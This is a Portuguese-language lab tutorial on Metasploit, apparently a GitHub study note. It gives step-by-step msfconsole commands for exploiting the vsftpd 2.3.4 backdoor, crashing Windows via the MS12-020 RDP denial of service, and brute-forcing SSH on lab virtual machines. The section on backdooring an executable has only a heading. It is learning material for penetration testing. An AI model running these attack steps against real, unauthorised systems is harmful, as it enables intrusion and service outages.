# FRAMEWORK METASPLOIT

**Metasploit** é uma plataforma de segurança cibernética usada principalmente para realizar testes de penetração e avaliações de segurança em sistemas de computadores e redes.  
Ele fornece uma coleção de ferramentas e exploits que permitem que profissionais de segurança identifiquem, explorem e documentem vulnerabilidades em sistemas-alvo.  
Um **exploit** é um programa, código ou técnica usado para aproveitar uma vulnerabilidade ou falha de segurança em um sistema, software ou rede.  
O objetivo principal de um exploit é explorar uma falha para realizar ataque.  

**Payload** é um código ou programa malicioso que é entregue e executado após a exploração de uma vulnerabilidade em um sistema  
- *single* = payload completo que realiza todas as acções (conexão inicial e ataque), sem precisar de etapas adicionais
- *stager* = payload pequeno que estabelece apenas a conexão inicial entre o atacante e o alvo
- *stage* = o payload que contém as ações do atacante, e pode ser carregado após o stager estabelecer a comunicação.  
**Meterpreter**, é um payload que funciona por injeção dll, é uma ferramenta “pós invasão”, para testes de penetração e ataques éticos.

  
Para realização dos estudos, utilizei o **mfsconsole**
- Interface de linha de comando do Metasploit
- Permite a execução de exploit, payloads, post-exploration e muito mais

Abaixo, todos os casos de estudo:
- [EXPLORANDO FALHAS NO FTP](#explorando-falhas-no-ftp)
- [ATAQUES DOS NO WINDOWS RDP](#ataques-dos-no-windows-rdp)
- [EXPLORANDO FALHAS NO SSH COM FORCA BRUTA](#explorando-falhas-no-ssh-com-forca-bruta)
- [ADICIONANDO BACKDOOR EM UM EXECUTÁVEL](#adicionando-backdoor-em-um-executavel)

---

## EXPLORANDO FALHAS NO FTP
Neste exemplo, iremos explorar uma falha na versão 2.3.4 do vsftpd que introduz uma backdoor no servidor FTP.  
Iremos utilizar o Metasploitable como alvo, e o Kali como origem do ataque.  
Estou utilizando os dois sistemas em máquinas virtuais.  

Primeiramente criei um arquivo *teste.txt* no Metasploitable para que possamos manipulá-lo após a invasão.  
No Kali, abriremos o console, entraremos no modo `sudo su` seguiremos os seguintes passos:  
- `msfconsole` = abre o console do metasploit  
- `search vsftpd`  
- `info exploit/unix/ftp/vsftpd_234_hackdoor`  
- `use exploit/unix/ftp/vsftpd_234_hackdoor` = selecionamos o exploit para uso  
- `show options` = mostra os requerimentos que precisamos definir no exploit  
- `set rhosts <ip do metaspoitable>` = ip do nosso alvo  
- `show payloads` = lista os payloads disponíveis  
- `set payload payload/cmd/unix/interact` = este payload permite que o atacante tenha um controle direto sobre a máquina invadida após o exploit  
- `show options` = para ver se os requerimentos estão definidos  
- `exploit`   
- `ls` = irá mostrar o diretório que estamos.  
- `ip addr` = vai mostra o ip da maquina que invadimos.  
E assim, estamos com acesso ao alvo, via terminal.  

---

## ATAQUES DOS NO WINDOWS RDP
**RDP(Remote Desktop Protocol)** é um protocolo desenvolvido pela Microsoft que permite que um usuário se conecte remotamente a outro computador ou servidor por meio de uma interface gráfica.  
Ele utiliza a porta 3389, TCP ou UDP.  
Este ataque DOS pode causar a interrupção de um serviço ou o travamento de um servidor Windows ao explorar o limite de IDs de canal no RDP.  
#### Simulação de ataque: causar tela azul no Windows.
Liguiei as máquinas virtuais do Windows XP e do Kali Linux.  
No Windows XP precisamos ativar o "remote desktop", através do Painle de Controle.
Pegar o ip do Windows 7 no CMD.  
Acessar o `mfsconsole` no Kali, a partir do modo `sudo su`.  
`search rdp` = procuramos os modulos disponíveis.  
Usaremos o módulo `use auxiliary/dos/windows/rdp/ms12_020_maxchannelids`.  
`show options` = pra verificar os requerimentos a serem definidos no módulo
`set rhosts 192.168.56.105` = definimos o IP do alvo.  
`run`  
Ataque bem sucedido, tela azul no Windows.  
![unnamed](https://github.com/user-attachments/assets/c94aeeca-346c-402c-a9a8-69665fd2e1dc)

---

## EXPLORANDO FALHAS NO SSH COM FROCA BRUTA
**SSH (Secure Shell)** é um protocolo de rede criptografado que permite a comunicação segura entre dois computadores.  
Por padrão, o servidor SSH escuta a porta 22.  
Para este ataque, utilizaremos o *Metasploitable* como alvo.  
Utilizaremos a técnica de *“Força Bruta”* para conseguir acesso ao servidor.  
Primeiramente, iniciamos as VM’s do *Kali* e do *Metasploitable*.  
No Kali, abrimos o console e seguimos os passos:  
- `msfconsole`
- `search ssh_login` = procuramos o módulo a ser utilizado
- `use auxiliary/scanner/ssh/ssh_login` = usaremos este módulo
- `info` = para verificar os requerimentos
- Neste caso, precisaremos definir, além do IP do alvo, dois arquivos que contenham informações de usuários e senhas.
- As informações contidas nestes arquivos, serão utilizadas para o ataque de força bruta.
- Sabemos que usuário e senha do Metasploitable são *“msfadmin”*.
- Então criei dois arquivos no Kali: *user.txt* e *password.txt*.
- Em ambos, devemos colocar uma “opção” por linha.
- Em ambos arquivos, pode-se colocar qualquer nomes para teste, mas devem conter também a informação correta em qualquer uma das linhas.
- Agora, definimos as informações necessárias:  
`set rhosts 192.168.56.101` = este é o IP do Mestasploitable  
`set USER_FILE /home/kali/user.txt` = arquivo com possíveis usuários  
`set PASS_FILE /home/kali/password.txt` = arquivo com possíveis senhas  
`exploit`  


Agora que o ataque foi bem sucedido, vamos confirmar as sessões abertas.  
`sessions` = vemos que existe uma sessão aberta  
`sessions 1` = acessamos a sessão  
Agora já estamos dentro do alvo, e digitamos o comando `ip addr` pra confirmar.  
Neste caso, o IP já é o do Metasploitable.  
![unnamed](https://github.com/user-attachments/assets/e1266107-6adc-4bc9-b5ff-72492951eaa0)


---

## ADICIONANDO BACKDOOR EM UM EXECUTÁVEL
...
